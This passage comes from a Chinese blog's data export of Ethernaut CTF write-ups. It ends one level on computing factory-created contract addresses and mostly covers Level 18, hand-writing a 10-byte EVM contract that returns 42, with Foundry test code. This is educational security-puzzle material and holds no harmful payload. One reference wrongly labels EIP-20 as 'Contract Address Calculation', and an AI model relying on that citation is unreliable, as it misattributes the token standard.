工厂合约在创建新合约时，应该总是返回新创建的合约地址，或者触发一个包含该地址的事件。这是一个良好的编程实践。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 修复建议</span><br><span class=\"line\">function generateToken(string memory _name, uint256 _initialSupply) public payable returns (address) &#123;</span><br><span class=\"line\">    SimpleToken token = new SimpleToken(_name, _initialSupply);</span><br><span class=\"line\">    token.transfer(msg.sender, msg.value);</span><br><span class=\"line\">    emit TokenCreated(address(token)); // 触发事件</span><br><span class=\"line\">    return address(token); // 返回地址</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>使用 <code>CREATE2</code></strong>: 如果需要更强的地址确定性（例如，在合约部署前就与其交互），可以使用 <code>CREATE2</code> 操作码。<code>CREATE2</code> 允许根据部署者地址、一个 <code>salt</code> 值和合约的初始化代码来预计算地址，提供了更大的灵活性。</p>\n</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>地址确定性计算</strong>: 理解合约地址是如何从部署者地址和 <code>nonce</code> 生成的，是EVM的一个核心概念。</li>\n<li><strong>RLP (Recursive-Length Prefix)</strong>: 以太坊用于序列化对象的主要编码方法。虽然在高级Solidity编程中不常直接使用，但理解其基本原理有助于深入了解EVM的内部工作方式。</li>\n<li><strong><code>keccak256</code></strong>: 以太坊中无处不在的哈希函数，用于地址生成、函数签名、数据校验等多种场景。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>合约地址是确定性的，可以预先计算。</li>\n<li>地址的计算依赖于部署者的地址和其 <code>nonce</code>。</li>\n<li>RLP编码是以太坊序列化数据的基础。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>当工厂合约没有返回或记录其创建的子合约地址时，攻击者可以通过链上数据（部署者地址和 <code>nonce</code>）自行计算出该地址。</li>\n<li>一旦找到地址，就可以与该合约进行交互，利用其内部的任何函数（如本例中的 <code>destroy</code>）。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>工厂合约应始终通过返回值或事件来暴露其创建的子合约地址。</li>\n<li>在设计合约时，遵循良好的编程实践，确保所有重要的信息都是可访问的。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-20\">EIP-20: Contract Address Calculation</a></li>\n<li><a href=\"https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/\">Ethereum Docs: RLP (Recursive-Length Prefix)</a></li>\n<li><a href=\"https://ethereum.stackexchange.com/questions/760/how-is-an-ethereum-address-created\">StackExchange: How is an Ethereum address created?</a></li>\n</ul>\n"},{"title":"Ethernaut Level 18: Magic Number - 手写EVM字节码","date":"2025-01-25T08:35:00.000Z","updated":"2025-01-25T08:35:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入EVM底层，学习如何手动编写合约的创建和运行时字节码。理解 `creation code` 和 `runtime code` 的区别，掌握 `PUSH1`, `MSTORE`, `CODECOPY`, `RETURN` 等核心操作码，完成 Magic Number 关卡的挑战。","_content":"\n# 🎯 Ethernaut Level 18: Magic Number - 手写EVM字节码\n\n> **关卡链接**: [Ethernaut Level 18 - Magic Number](https://ethernaut.openzeppelin.com/level/18)  \n> **攻击类型**: EVM字节码编写  \n> **难度**: ⭐⭐⭐⭐⭐\n\n## 📋 挑战目标\n\n你需要部署一个合约，它必须满足两个条件：\n1.  它的运行时字节码（`runtime bytecode`）大小不能超过10个字节。\n2.  当调用它的 `whatIsTheMeaningOfLife()` 函数时，必须返回 `42`。\n\n![Magic Number Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel18.svg)\n\n## 🔍 漏洞分析\n\n这个挑战将我们带入EVM的底层。使用Solidity编写一个返回42的函数非常简单，但编译后的字节码会远远超过10字节的限制，因为它包含了函数调度器、安全检查等大量额外代码。\n\n```solidity\n// 编译后字节码会很长，无法通过关卡\ncontract NormalSolver {\n    function whatIsTheMeaningOfLife() public pure returns (uint256) {\n        return 42;\n    }\n}\n```\n\n因此，我们必须手动编写EVM字节码。我们需要分别构建两部分代码：\n\n1.  **运行时代码 (Runtime Code)**: 这是最终存储在链上的代码，负责在被调用时返回42。这部分代码的长度必须小于等于10字节。\n2.  **创建代码 (Creation Code)**: 这是部署合约时执行的代码。它的任务只有一个：将运行时代码返回，以便EVM将其存储为新合约的代码。\n\n### 1. 构建运行时代码 (Runtime Code)\n\n我们的运行时代码需要做两件事：\n1.  将数字 `42` (十六进制为 `0x2a`) 放入内存。\n2.  从内存中返回这个数字。\n\n这需要以下操作码（Opcodes）：\n\n| Opcode | 名称   | 作用                               |\n| :----- | :----- | :--------------------------------- |\n| `0x60` | `PUSH1`| 将1个字节的数据压入堆栈。          |\n| `0x52` | `MSTORE`| `MSTORE(p, v)`: 将值 `v` 存入内存地址 `p`。 |\n| `0xf3` | `RETURN`| `RETURN(p, s)`: 从内存地址 `p` 开始，返回 `s` 字节的数据。 |\n\n执行步骤如下：\n1.  `PUSH1 0x2a`: 将 `42` 压入堆栈。\n2.  `PUSH1 0x80`: 将内存地址 `0x80` 压入堆栈。（`0x80` 是Solidity中自由内存指针的起始位置，使用它是惯例）。\n3.  `MSTORE`: `mstore(0x80, 0x2a)`，将 `42` 存入内存。\n4.  `PUSH1 0x20`: 将返回值大小 `32` 字节（一个 `uint256`）压入堆栈。\n5.  `PUSH1 0x80`: 将返回的内存地址 `0x80` 压入堆栈。\n6.  `RETURN`: `return(0x80, 0x20)`，返回结果。\n\n将这些步骤转换为字节码：\n`602a` `6080` `52` `6020` `6080` `f3`\n\n这个字节码的长度是10字节：`0x602a60805260206080f3`。完美符合要求！\n\n### 2. 构建创建代码 (Creation Code)\n\n创建代码的任务是将上面的10字节运行时代码返回给EVM。它需要做两件事：\n1.  将运行时代码从创建代码的末尾复制到内存中。\n2.  从内存中返回这段运行时代码。\n\n这需要 `CODECOPY` 操作码：\n\n| Opcode | 名称     | 作用                               |\n| :----- | :------- | :--------------------------------- |\n| `0x39` | `CODECOPY`| `CODECOPY(d, p, s)`: 从代码的 `p` 位置开始，复制 `s` 字节到内存的 `d` 位置。 |\n\n执行步骤如下：\n1.  将运行时代码复制到内存 `0x00` 处。\n2.  从内存 `0x00` 处返回10字节的代码。\n\n字节码如下：\n-   `600a`: `PUSH1 0x0a` (运行时代码长度: 10字节)\n-   `600c`: `PUSH1 0x0c` (运行时代码在创建代码中的起始位置: 第12字节)\n-   `6000`: `PUSH1 0x00` (目标内存地址: 0)\n-   `39`: `CODECOPY`\n-   `600a`: `PUSH1 0x0a` (要返回的数据长度: 10字节)\n-   `6000`: `PUSH1 0x00` (要返回的内存地址: 0)\n-   `f3`: `RETURN`\n\n创建代码为: `0x600a600c600039600a6000f3`。它的长度是12字节。\n\n### 3. 组合最终字节码\n\n最终部署的字节码是 **创建代码 + 运行时代码**：\n`0x600a600c600039600a6000f3` + `602a60805260206080f3`\n\n最终字节码: `0x600a600c600039600a6000f3602a60805260206080f3`\n\n## 💻 Foundry 实现\n\n我们可以使用 Foundry 的内联汇编和 `create` 操作码来部署这段字节码。\n\n### Foundry 测试代码\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/18_MagicNumber.sol\";\n\ninterface ISolver {\n    function whatIsTheMeaningOfLife() external view returns (uint256);\n}\n\ncontract MagicNumberTest is Test {\n    MagicNum instance;\n    Attack attack;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        attack = new Attack();\n        instance = new MagicNum();\n    }\n\n    function testAttacker() public {\n        // 部署我们的手写字节码合约\n        address solverAddress = attack.deploySolver();\n        instance.setSolver(solverAddress);\n\n        // 验证返回值是否为 42\n        assertEq(ISolver(solverAddress).whatIsTheMeaningOfLife(), 42);\n\n        // 验证字节码长度是否为 10\n        uint256 size;\n        assembly {\n            size := extcodesize(solverAddress)\n        }\n        assertEq(size, 10);\n    }\n}\n\ncontract Attack {\n    function deploySolver() public returns (address) {\n        address solver;\n        // 最终的部署字节码\n        bytes memory bytecode = hex\"600a600c600039600a6000f3602a60805260206080f3\";\n        \n        assembly {\n            // create(v, p, s): 部署合约\n            // v: 发送的 ether 值 (0)\n            // p: 字节码在内存中的位置 (bytecode + 0x20)\n            // s: 字节码的长度 (mload(bytecode))\n            solver := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n        return solver;\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **设计运行时代码**: 精心设计一段不超过10字节的代码，使其能够返回 `42`。\n2.  **设计创建代码**: 设计一段代码，其功能是返回第一步中设计的运行时代码。\n3.  **组合字节码**: 将创建代码和运行时代码拼接成最终的部署字节码。\n4.  **部署**: 使用 `create` 操作码（可以通过内联汇编或发送裸交易）来部署这段字节码，得到求解器合约的地址。\n5.  **提交**: 将求解器合约的地址提交给 `Ethernaut` 关卡。\n\n## 🛡️ 防御措施\n\n这个关卡本身不是一个漏洞，而是一个EVM编程的练习。然而，它揭示了在进行字节码级别的审计时需要注意的事项：\n\n-   **理解底层操作**: 仅仅审计Solidity代码可能不足以发现所有问题。对于高度优化的或使用内联汇编的合约，必须理解其生成的EVM操作码的实际行为。\n-   **警惕不寻常的部署模式**: 如果一个合约的创建过程不标准（例如，使用裸 `create` 或 `create2`），需要特别审查其字节码的来源和功能。\n\n## 🔧 相关工具和技术\n\n-   **EVM Opcodes**: EVM的操作码是其执行所有计算的基础。`evm.codes` 是一个极好的交互式参考网站。\n-   **内联汇编 (`assembly`)**: Solidity允许在代码中直接嵌入汇编语言，提供了对EVM更底层的控制，但同时也带来了更大的风险和复杂性。\n-   **`create` 操作码**: 用于从代码中部署新合约。\n-   **`extcodesize` 操作码**: 用于获取一个地址上的代码大小。\n\n## 🎯 总结\n\n**核心概念**:\n-   合约的字节码分为 `creation code` 和 `runtime code`。\n-   `creation code` 在部署时执行一次，其返回值是 `runtime code`。\n-   `runtime code` 是永久存储在链上的代码，响应外部调用。\n-   通过直接操作EVM操作码，可以创建出非常紧凑和高效的合约。\n\n**攻击向量**:\n-   通过手写汇编，绕过高级语言的限制（如本例中的代码大小限制）。\n\n**防御策略**:\n-   在安全审计中，不能忽视对底层字节码和汇编的分析，特别是当合约行为不寻常时。\n\n## 📚 参考资料\n\n-   [EVM Codes - An Interactive Reference](https://www.evm.codes/)\n-   [Deconstructing a Solidity Contract](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737)\n-   [Solidity Docs: Inline Assembly](https://docs.soliditylang.org/en/latest/assembly.html)","source":"_posts/ethernaut-level-18-magic-number.md","raw":"---\ntitle: 'Ethernaut Level 18: Magic Number - 手写EVM字节码'\ndate: 2025-01-25 16:35:00\nupdated: 2025-01-25 16:35:00\ncategories:\n  - Ethernaut 系列\n  - 进阶攻击篇 (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - EVM\n  - Bytecode\n  - Assembly\n  - Opcodes\n  - 智能合约安全\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入EVM底层，学习如何手动编写合约的创建和运行时字节码。理解 `creation code` 和 `runtime code` 的区别，掌握 `PUSH1`, `MSTORE`, `CODECOPY`, `RETURN` 等核心操作码，完成 Magic Number 关卡的挑战。\"\n---\n\n# 🎯 Ethernaut Level 18: Magic Number - 手写EVM字节码\n\n> **关卡链接**: [Ethernaut Level 18 - Magic Number](https://ethernaut.openzeppelin.com/level/18)  \n> **攻击类型**: EVM字节码编写  \n> **难度**: ⭐⭐⭐⭐⭐\n\n## 📋 挑战目标\n\n你需要部署一个合约，它必须满足两个条件：\n1.  它的运行时字节码（`runtime bytecode`）大小不能超过10个字节。\n2.  当调用它的 `whatIsTheMeaningOfLife()` 函数时，必须返回 `42`。\n\n![Magic Number Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel18.svg)\n\n## 🔍 漏洞分析\n\n这个挑战将我们带入EVM的底层。使用Solidity编写一个返回42的函数非常简单，但编译后的字节码会远远超过10字节的限制，因为它包含了函数调度器、安全检查等大量额外代码。\n\n```solidity\n// 编译后字节码会很长，无法通过关卡\ncontract NormalSolver {\n    function whatIsTheMeaningOfLife() public pure returns (uint256) {\n        return 42;\n    }\n}\n```\n\n因此，我们必须手动编写EVM字节码。我们需要分别构建两部分代码：\n\n1.  **运行时代码 (Runtime Code)**: 这是最终存储在链上的代码，负责在被调用时返回42。这部分代码的长度必须小于等于10字节。\n2.  **创建代码 (Creation Code)**: 这是部署合约时执行的代码。它的任务只有一个：将运行时代码返回，以便EVM将其存储为新合约的代码。\n\n### 1. 构建运行时代码 (Runtime Code)\n\n我们的运行时代码需要做两件事：\n1.  将数字 `42` (十六进制为 `0x2a`) 放入内存。\n2.  从内存中返回这个数字。\n\n这需要以下操作码（Opcodes）：\n\n| Opcode | 名称   | 作用                               |\n| :----- | :----- | :--------------------------------- |\n| `0x60` | `PUSH1`| 将1个字节的数据压入堆栈。          |\n| `0x52` | `MSTORE`| `MSTORE(p, v)`: 将值 `v` 存入内存地址 `p`。 |\n| `0xf3` | `RETURN`| `RETURN(p, s)`: 从内存地址 `p` 开始，返回 `s` 字节的数据。 |\n\n执行步骤如下：\n1.  `PUSH1 0x2a`: 将 `42` 压入堆栈。\n2.  `PUSH1 0x80`: 将内存地址 `0x80` 压入堆栈。（`0x80` 是Solidity中自由内存指针的起始位置，使用它是惯例）。\n3.  `MSTORE`: `mstore(0x80, 0x2a)`，将 `42` 存入内存。\n4.  `PUSH1 0x20`: 将返回值大小 `32` 字节（一个 `uint256`）压入堆栈。\n5.  `PUSH1 0x80`: 将返回的内存地址 `0x80` 压入堆栈。\n6.  `RETURN`: `return(0x80, 0x20)`，返回结果。\n\n将这些步骤转换为字节码：\n`602a` `6080` `52` `6020` `6080` `f3`\n\n这个字节码的长度是10字节：`0x602a60805260206080f3`。完美符合要求！\n\n### 2. 构建创建代码 (Creation Code)\n\n创建代码的任务是将上面的10字节运行时代码返回给EVM。它需要做两件事：\n1.  将运行时代码从创建代码的末尾复制到内存中。\n2.  从内存中返回这段运行时代码。\n\n这需要 `CODECOPY` 操作码：\n\n| Opcode | 名称     | 作用                               |\n| :----- | :------- | :--------------------------------- |\n| `0x39` | `CODECOPY`| `CODECOPY(d, p, s)`: 从代码的 `p` 位置开始，复制 `s` 字节到内存的 `d` 位置。 |\n\n执行步骤如下：\n1.  将运行时代码复制到内存 `0x00` 处。\n2.  从内存 `0x00` 处返回10字节的代码。\n\n字节码如下：\n-   `600a`: `PUSH1 0x0a` (运行时代码长度: 10字节)\n-   `600c`: `PUSH1 0x0c` (运行时代码在创建代码中的起始位置: 第12字节)\n-   `6000`: `PUSH1 0x00` (目标内存地址: 0)\n-   `39`: `CODECOPY`\n-   `600a`: `PUSH1 0x0a` (要返回的数据长度: 10字节)\n-   `6000`: `PUSH1 0x00` (要返回的内存地址: 0)\n-   `f3`: `RETURN`\n\n创建代码为: `0x600a600c600039600a6000f3`。它的长度是12字节。\n\n### 3. 组合最终字节码\n\n最终部署的字节码是 **创建代码 + 运行时代码**：\n`0x600a600c600039600a6000f3` + `602a60805260206080f3`\n\n最终字节码: `0x600a600c600039600a6000f3602a60805260206080f3`\n\n## 💻 Foundry 实现\n\n我们可以使用 Foundry 的内联汇编和 `create` 操作码来部署这段字节码。\n\n### Foundry 测试代码\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/18_MagicNumber.sol\";\n\ninterface ISolver {\n    function whatIsTheMeaningOfLife() external view returns (uint256);\n}\n\ncontract MagicNumberTest is Test {\n    MagicNum instance;\n    Attack attack;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        attack = new Attack();\n        instance = new MagicNum();\n    }\n\n    function testAttacker() public {\n        // 部署我们的手写字节码合约\n        address solverAddress = attack.deploySolver();\n        instance.setSolver(solverAddress);\n\n        // 验证返回值是否为 42\n        assertEq(ISolver(solverAddress).whatIsTheMeaningOfLife(), 42);\n\n        // 验证字节码长度是否为 10\n        uint256 size;\n        assembly {\n            size := extcodesize(solverAddress)\n        }\n        assertEq(size, 10);\n    }\n}\n\ncontract Attack {\n    function deploySolver() public returns (address) {\n        address solver;\n        // 最终的部署字节码\n        bytes memory bytecode = hex\"600a600c600039600a6000f3602a60805260206080f3\";\n        \n        assembly {\n            // create(v, p, s): 部署合约\n            // v: 发送的 ether 值 (0)\n            // p: 字节码在内存中的位置 (bytecode + 0x20)\n            // s: 字节码的长度 (mload(bytecode))\n            solver := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n        return solver;\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **设计运行时代码**: 精心设计一段不超过10字节的代码，使其能够返回 `42`。\n2.  **设计创建代码**: 设计一段代码，其功能是返回第一步中设计的运行时代码。\n3.  **组合字节码**: 将创建代码和运行时代码拼接成最终的部署字节码。\n4.  **部署**: 使用 `create` 操作码（可以通过内联汇编或发送裸交易）来部署这段字节码，得到求解器合约的地址。\n5.  **提交**: 将求解器合约的地址提交给 `Ethernaut` 关卡。\n\n## 🛡️ 防御措施\n\n这个关卡本身不是一个漏洞，而是一个EVM编程的练习。然而，它揭示了在进行字节码级别的审计时需要注意的事项：\n\n-   **理解底层操作**: 仅仅审计Solidity代码可能不足以发现所有问题。对于高度优化的或使用内联汇编的合约，必须理解其生成的EVM操作码的实际行为。\n-   **警惕不寻常的部署模式**: 如果一个合约的创建过程不标准（例如，使用裸 `create` 或 `create2`），需要特别审查其字节码的来源和功能。\n\n## 🔧 相关工具和技术\n\n-   **EVM Opcodes**: EVM的操作码是其执行所有计算的基础。`evm.codes` 是一个极好的交互式参考网站。\n-   **内联汇编 (`assembly`)**: Solidity允许在代码中直接嵌入汇编语言，提供了对EVM更底层的控制，但同时也带来了更大的风险和复杂性。\n-   **`create` 操作码**: 用于从代码中部署新合约。\n-   **`extcodesize` 操作码**: 用于获取一个地址上的代码大小。\n\n## 🎯 总结\n\n**核心概念**:\n-   合约的字节码分为 `creation code` 和 `runtime code`。\n-   `creation code` 在部署时执行一次，其返回值是 `runtime code`。\n-   `runtime code` 是永久存储在链上的代码，响应外部调用。\n-   通过直接操作EVM操作码，可以创建出非常紧凑和高效的合约。\n\n**攻击向量**:\n-   通过手写汇编，绕过高级语言的限制（如本例中的代码大小限制）。\n\n**防御策略**:\n-   在安全审计中，不能忽视对底层字节码和汇编的分析，特别是当合约行为不寻常时。\n\n## 📚 参考资料\n\n-   [EVM Codes - An Interactive Reference](https://www.evm.codes/)\n-   [Deconstructing a Solidity Contract](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737)\n-   [Solidity Docs: Inline Assembly](https://docs.soliditylang.org/en/latest/assembly.html)","slug":"ethernaut-level-18-magic-number","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpg001cbf5qdh9ngvlv","content":"<h1 id=\"🎯-Ethernaut-Level-18-Magic-Number-手写EVM字节码\"><a href=\"#🎯-Ethernaut-Level-18-Magic-Number-手写EVM字节码\" class=\"headerlink\" title=\"🎯 Ethernaut Level 18: Magic Number - 手写EVM字节码\"></a>🎯 Ethernaut Level 18: Magic Number - 手写EVM字节码</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/18\">Ethernaut Level 18 - Magic Number</a><br><strong>攻击类型</strong>: EVM字节码编写<br><strong>难度</strong>: ⭐⭐⭐⭐⭐</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>你需要部署一个合约，它必须满足两个条件：</p>\n<ol>\n<li>它的运行时字节码（<code>runtime bytecode</code>）大小不能超过10个字节。</li>\n<li>当调用它的 <code>whatIsTheMeaningOfLife()</code> 函数时，必须返回 <code>42</code>。</li>\n</ol>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel18.svg\" alt=\"Magic Number Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>这个挑战将我们带入EVM的底层。使用Solidity编写一个返回42的函数非常简单，但编译后的字节码会远远超过10字节的限制，因为它包含了函数调度器、安全检查等大量额外代码。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 编译后字节码会很长，无法通过关卡</span><br><span class=\"line\">contract NormalSolver &#123;</span><br><span class=\"line\">    function whatIsTheMeaningOfLife() public pure returns (uint256) &#123;</span><br><span class=\"line\">        return 42;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因此，我们必须手动编写EVM字节码。我们需要分别构建两部分代码：</p>\n<ol>\n<li><strong>运行时代码 (Runtime Code)</strong>: 这是最终存储在链上的代码，负责在被调用时返回42。这部分代码的长度必须小于等于10字节。</li>\n<li><strong>创建代码 (Creation Code)</strong>: 这是部署合约时执行的代码。它的任务只有一个：将运行时代码返回，以便EVM将其存储为新合约的代码。</li>\n</ol>\n<h3 id=\"1-构建运行时代码-Runtime-Code\"><a href=\"#1-构建运行时代码-Runtime-Code\" class=\"headerlink\" title=\"1. 构建运行时代码 (Runtime Code)\"></a>1. 构建运行时代码 (Runtime Code)</h3><p>我们的运行时代码需要做两件事：</p>\n<ol>\n<li>将数字 <code>42</code> (十六进制为 <code>0x2a</code>) 放入内存。</li>\n<li>从内存中返回这个数字。</li>\n</ol>\n<p>这需要以下操作码（Opcodes）：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Opcode</th>\n<th align=\"left\">名称</th>\n<th align=\"left\">作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>0x60</code></td>\n<td align=\"left\"><code>PUSH1</code></td>\n<td align=\"left\">将1个字节的数据压入堆栈。</td>\n</tr>\n<tr>\n<td align=\"left\"><code>0x52</code></td>\n<td align=\"left\"><code>MSTORE</code></td>\n<td align=\"left\"><code>MSTORE(p, v)</code>: 将值 <code>v</code> 存入内存地址 <code>p</code>。</td>\n</tr>\n<tr>\n<td align=\"left\"><code>0xf3</code></td>\n<td align=\"left\"><code>RETURN</code></td>\n<td align=\"left\"><code>RETURN(p, s)</code>: 从内存地址 <code>p</code> 开始，返回 <code>s</code> 字节的数据。</td>\n</tr>\n</tbody></table>\n<p>执行步骤如下：</p>\n<ol>\n<li><code>PUSH1 0x2a</code>: 将 <code>42</code> 压入堆栈。</li>\n<li><code>PUSH1 0x80</code>: 将内存地址 <code>0x80</code> 压入堆栈。（<code>0x80</code> 是Solidity中自由内存指针的起始位置，使用它是惯例）。</li>\n<li><code>MSTORE</code>: <code>mstore(0x80, 0x2a)</code>，将 <code>42</code> 存入内存。</li>\n<li><code>PUSH1 0x20</code>: 将返回值大小 <code>32</code> 字节（一个 <code>uint256</code>）压入堆栈。</li>\n<li><code>PUSH1 0x80</code>: 将返回的内存地址 <code>0x80</code> 压入堆栈。</li>\n<li><code>RETURN</code>: <code>return(0x80, 0x20)</code>，返回结果。</li>\n</ol>\n<p>将这些步骤转换为字节码：<br><code>602a</code> <code>6080</code> <code>52</code> <code>6020</code> <code>6080</code> <code>f3</code></p>\n<p>这个字节码的长度是10字节：<code>0x602a60805260206080f3</code>。完美符合要求！</p>\n<h3 id=\"2-构建创建代码-Creation-Code\"><a href=\"#2-构建创建代码-Creation-Code\" class=\"headerlink\" title=\"2. 构建创建代码 (Creation Code)\"></a>2. 构建创建代码 (Creation Code)</h3><p>创建代码的任务是将上面的10字节运行时代码返回给EVM。它需要做两件事：</p>\n<ol>\n<li>将运行时代码从创建代码的末尾复制到内存中。</li>\n<li>从内存中返回这段运行时代码。</li>\n</ol>\n<p>这需要 <code>CODECOPY</code> 操作码：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Opcode</th>\n<th align=\"left\">名称</th>\n<th align=\"left\">作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>0x39</code></td>\n<td align=\"left\"><code>CODECOPY</code></td>\n<td align=\"left\"><code>CODECOPY(d, p, s)</code>: 从代码的 <code>p</code> 位置开始，复制 <code>s</code> 字节到内存的 <code>d</code> 位置。</td>\n</tr>\n</tbody></table>\n<p>执行步骤如下：</p>\n<ol>\n<li>将运行时代码复制到内存 <code>0x00</code> 处。</li>\n<li>从内存 <code>0x00</code> 处返回10字节的代码。</li>\n</ol>\n<p>字节码如下：</p>\n<ul>\n<li><code>600a</code>: <code>PUSH1 0x0a</code> (运行时代码长度: 10字节)</li>\n<li><code>600c</code>: <code>PUSH1 0x0c</code> (运行时代码在创建代码中的起始位置: 第12字节)</li>\n<li><code>6000</code>: <code>PUSH1 0x00</code> (目标内存地址: 0)</li>\n<li><code>39</code>: <code>CODECOPY</code></li>\n<li><code>600a</code>: <code>PUSH1 0x0a</code> (要返回的数据长度: 10字节)</li>\n<li><code>6000</code>: <code>PUSH1 0x00</code> (要返回的内存地址: 0)</li>\n<li><code>f3</code>: <code>RETURN</code></li>\n</ul>\n<p>创建代码为: <code>0x600a600c600039600a6000f3</code>。它的长度是12字节。</p>\n<h3 id=\"3-组合最终字节码\"><a href=\"#3-组合最终字节码\" class=\"headerlink\" title=\"3. 组合最终字节码\"></a>3. 组合最终字节码</h3><p>最终部署的字节码是 <strong>创建代码 + 运行时代码</strong>：<br><code>0x600a600c600039600a6000f3</code> + <code>602a60805260206080f3</code></p>\n<p>最终字节码: <code>0x600a600c600039600a6000f3602a60805260206080f3</code></p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><p>我们可以使用 Foundry 的内联汇编和 <code>create</code> 操作码来部署这段字节码。</p>\n<h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/18_MagicNumber.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">interface ISolver &#123;</span><br><span class=\"line\">    function whatIsTheMeaningOfLife() external view returns (uint256);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MagicNumberTest is Test &#123;</span><br><span class=\"line\">    MagicNum instance;</span><br><span class=\"line\">    Attack attack;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        attack = new Attack();</span><br><span class=\"line\">        instance = new MagicNum();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        // 部署我们的手写字节码合约</span><br><span class=\"line\">        address solverAddress = attack.deploySolver();</span><br><span class=\"line\">        instance.setSolver(solverAddress);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 